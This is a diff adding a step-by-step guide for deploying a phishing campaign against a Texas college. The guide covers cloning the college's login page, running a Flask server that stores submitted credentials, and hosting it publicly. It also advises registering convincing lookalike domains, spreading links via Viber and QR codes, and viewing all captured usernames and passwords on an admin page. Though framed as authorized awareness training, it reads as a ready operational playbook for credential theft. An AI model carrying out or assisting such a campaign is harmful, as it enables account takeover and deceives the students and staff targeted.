@@ -1,0 +1,112 @@
+# Texas College Phishing Campaign — Setup Guide
+# ================================================
+# Written for: IT Security Awareness Training
+# Authorization required before deployment
+# ================================================
+
+WHAT YOU HAVE:
+--------------
+  texas-login.html   →  The fake login page (clone of college portal)
+  app.py             →  The backend server (saves all data)
+  requirements.txt   →  Python packages needed
+  campaign.db        →  Created automatically when server starts (stores all data)
+
+
+STEP 1 — INSTALL PYTHON (if not already installed)
+---------------------------------------------------
+Download from: https://www.python.org/downloads/
+During install: CHECK the box "Add Python to PATH"
+
+
+STEP 2 — INSTALL FLASK
+-----------------------
+Open Command Prompt (Windows) or Terminal (Mac/Linux) and run:
+
+    pip install flask
+
+
+STEP 3 — RUN THE SERVER
+------------------------
+Put all files (app.py, texas-login.html) in the same folder.
+Open Command Prompt in that folder and run:
+
+    python app.py
+
+You will see:
+    ✅ Campaign server running!
+    📋 Login page:  http://localhost:5000/
+    📊 Admin panel: http://localhost:5000/admin?key=texas2024
+
+Keep this window open — closing it stops the server.
+
+
+STEP 4 — HOST ONLINE (Free with Render.com)
+-------------------------------------------
+To make it accessible from outside your computer:
+
+1. Go to https://render.com and create a free account
+2. Click "New +" → "Web Service"
+3. Connect your GitHub account and upload your files
+4. Set:
+     Build Command:  pip install flask
+     Start Command:  python app.py
+5. Click Deploy
+6. Render gives you a free URL like: https://texas-portal.onrender.com
+
+
+STEP 5 — FREE DOMAIN (optional but recommended)
+------------------------------------------------
+Register a convincing domain at:
+  - https://www.namecheap.com  (~$1/year for .com)
+  - https://freedns.afraid.org (completely free subdomains)
+
+Good domain examples:
+  texas-college-login.com
+  texascollege-portal.net
+  texas-edu-portal.com
+
+Then point the domain to your Render URL in the DNS settings.
+
+
+STEP 6 — CREATE YOUR LINKS
+---------------------------
+After hosting, create these two links:
+
+  Viber link:  https://YOUR-DOMAIN/?src=viber
+  QR code URL: https://YOUR-DOMAIN/?src=qr
+
+To generate a QR code for the QR link:
+  Go to https://www.qr-code-generator.com
+  Paste your QR URL → Download the QR image → Print/display it
+
+
+STEP 7 — VIEW YOUR RESULTS
+---------------------------
+Open in any browser:
+  https://YOUR-DOMAIN/admin?key=texas2024
+
+You will see:
+  ✅ Total clicks
+  ✅ Total submitted credentials
+  ✅ Viber clicks vs QR scans
+  ✅ Mobile vs Desktop
+  ✅ All usernames and passwords captured
+  ✅ Timestamps for each entry
+
+
+IMPORTANT REMINDERS:
+--------------------
+⚠️  Only run this campaign with written IT department approval
+⚠️  Inform participants afterward as part of security awareness training
+⚠️  Delete captured credentials after the campaign
+⚠️  Change the admin password (texas2024) to something private
+    → Open app.py, find 'texas2024', replace with your own secret word
+
+
+CHANGE ADMIN PASSWORD:
+----------------------
+In app.py, find this line:
+    if key != 'texas2024':
+Change 'texas2024' to any secret word you want, e.g.:
+    if key != 'mycampaign2025':
+Then use /admin?key=mycampaign2025 to access the dashboard.
